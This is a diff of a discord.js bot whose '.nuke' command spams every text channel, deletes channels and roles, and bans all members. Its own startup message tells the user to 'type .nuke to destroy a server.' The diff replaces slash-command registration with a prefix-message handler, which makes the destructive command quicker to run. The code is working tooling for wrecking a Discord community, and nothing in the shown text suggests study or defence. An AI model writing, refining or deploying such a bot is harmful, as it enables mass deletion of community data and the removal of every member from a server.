@@ -1,9 +1,8 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, REST, Routes, PermissionFlagsBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');
 
 const TOKEN = process.env.DISCORD_TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID;
+const PREFIX = '.';               // Command prefix
 
 if (!TOKEN) {
     console.error('FATAL: DISCORD_TOKEN missing.');
@@ -18,35 +17,9 @@ const client = new Client({
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMembers,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent   // Required for reading prefix commands
     ]
 });
-
-// ---------- Slash command registration ----------
-const commands = [
-    {
-        name: 'nuke',
-        description: '⚠️ SPAM + DELETE EVERYTHING (channels, roles, bans all members)',
-        default_member_permissions: '0'
-    }
-];
-
-const rest = new REST({ version: '10' }).setToken(TOKEN);
-
-(async () => {
-    try {
-        console.log('Registering slash commands...');
-        if (GUILD_ID) {
-            await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
-            console.log(`Registered guild commands for ${GUILD_ID}`);
-        } else {
-            await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
-            console.log('Registered global commands (may take up to 1 hour)');
-        }
-    } catch (error) {
-        console.error('Command registration error:', error);
-    }
-})();
 
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -57,7 +30,6 @@ async function spamAllChannels(guild) {
 
     console.log(`🔥 Spamming ${textChannels.size} channels with: ${SPAM_MESSAGE}`);
 
-    // Send to all channels concurrently (as fast as Discord allows)
     const promises = textChannels.map(async (channel) => {
         try {
             await channel.send(SPAM_MESSAGE);
@@ -82,7 +54,7 @@ async function nukeServer(guild, executor) {
     await spamAllChannels(guild);
     logs.push('✅ Spam phase completed.');
 
-    // 1. Create temporary log channel (may be deleted later)
+    // 1. Create temporary log channel
     let logChannel = null;
     try {
         logChannel = await guild.channels.create({
@@ -222,22 +194,30 @@ async function nukeServer(guild, executor) {
     return { finalChannel, logs };
 }
 
-// ---------- Command handler ----------
-client.on('interactionCreate', async interaction => {
-    if (!interaction.isChatInputCommand()) return;
-    if (interaction.commandName === 'nuke') {
-        if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator) && interaction.user.id !== interaction.guild.ownerId) {
-            return interaction.reply({ content: '❌ You need Administrator permission.', ephemeral: true });
+// ---------- PREFIX COMMAND HANDLER ----------
+client.on('messageCreate', async (message) => {
+    // Ignore bots, empty messages, or messages not starting with prefix
+    if (message.author.bot) return;
+    if (!message.content.startsWith(PREFIX)) return;
+
+    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
+
+    if (command === 'nuke') {
+        // Permission check: Administrator or Guild Owner
+        if (!message.member.permissions.has(PermissionFlagsBits.Administrator) && message.author.id !== message.guild.ownerId) {
+            return message.reply({ content: '❌ You need Administrator permission to use this command.', allowedMentions: { repliedUser: false } });
         }
 
-        await interaction.reply({ content: '⚠️ **NUKE + SPAM initiated!** Spamming all text channels now, then deleting everything and banning all members. This is irreversible.', ephemeral: true });
+        // Send immediate acknowledgment (ephemeral-like but in channel)
+        await message.reply({ content: '⚠️ **NUKE + SPAM initiated!** Spamming all text channels now, then deleting everything and banning all members. This is irreversible.', allowedMentions: { repliedUser: false } });
 
         try {
-            await nukeServer(interaction.guild, interaction.user);
+            await nukeServer(message.guild, message.author);
         } catch (err) {
             console.error('Nuke error:', err);
             try {
-                await interaction.followUp({ content: `❌ Nuke failed: ${err.message}`, ephemeral: true });
+                await message.channel.send({ content: `❌ Nuke failed: ${err.message}` });
             } catch (e) {}
         }
     }
@@ -246,7 +226,8 @@ client.on('interactionCreate', async interaction => {
 client.once('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     console.log(`Serving ${client.guilds.cache.size} guilds`);
+    console.log(`Command prefix: "${PREFIX}" – type ${PREFIX}nuke to destroy a server.`);
 });
 
 process.on('unhandledRejection', console.error);
-client.login(TOKEN); 
+client.login(TOKEN);
